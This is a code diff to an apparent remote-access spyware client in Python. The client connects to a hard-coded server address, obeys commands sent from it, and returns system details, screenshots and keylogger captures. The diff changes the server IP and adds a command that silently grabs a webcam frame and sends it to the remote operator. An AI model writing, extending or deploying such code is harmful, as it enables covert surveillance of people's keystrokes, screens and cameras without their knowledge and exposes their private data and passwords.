@@ -8,11 +8,12 @@ import pyautogui
 import io
 from pynput import keyboard
 import threading
+import cv2
 
 class App:
     def __init__(self):
         self.running = True
-        self.hostname = "192.168.1.19" #server ip address
+        self.hostname = "10.199.0.68" #server ip address
         self.port = 5554
         self.socket = None
         self.listener = None
@@ -29,7 +30,7 @@ class App:
                         msg_in = self.socket.recv(4096).decode()
                         header, msg, data = self.cmd_(msg_in)
                         self.socket.send(header.encode())
-                        time.sleep(0.1)
+                        time.sleep(0.5)
                         if data != None:
                             self.socket.sendall(data)
                         else:
@@ -142,11 +143,11 @@ class App:
             text += "\n Disk used (GB) : " + str(round(disk.used / (1024 ** 3), 2))
             text += "\n Disk usage (%) : " + str(disk.percent)
             
-        elif cmd in ["screenshot", "screencapture", "takephoto"]:
+        elif input_ in ["screenshot", "screencapture", "takephoto"]:
             try:
                 screenshot = pyautogui.screenshot()
                 img_bytes = io.BytesIO()
-                screenshot.save(img_bytes, format='PNG')
+                screenshot.save(img_bytes, format="PNG")
                 data = img_bytes.getvalue()
                 
                 header = f"IMG:{len(data)}"
@@ -161,6 +162,23 @@ class App:
                 self.listener.stop()
             elif args in ["get", "read", "getkeys"]:
                 text = "keys : " + "".join(self.keys_log)
+                
+        elif input_ in ["snapshot", "getwebcam", "webcamcapture", "webcamsnapshot"]:
+            try:
+                capture = cv2.VideoCapture(0)
+                ret, frame = capture.read()
+                capture.release()
+                if ret:
+                    _, buffer = cv2.imencode(".png", frame)
+                    data = buffer.tobytes()
+                    
+                    header = f"IMG:{len(data)}"
+                else:
+                    text = "couldn't take a snapshot ..."
+            except Exception as e:
+                text = "error while taking snapshot : " + str(e)
+            
+            
     
         elif input_ in ["exit", "ex", "/exit"]:
             self.running = False
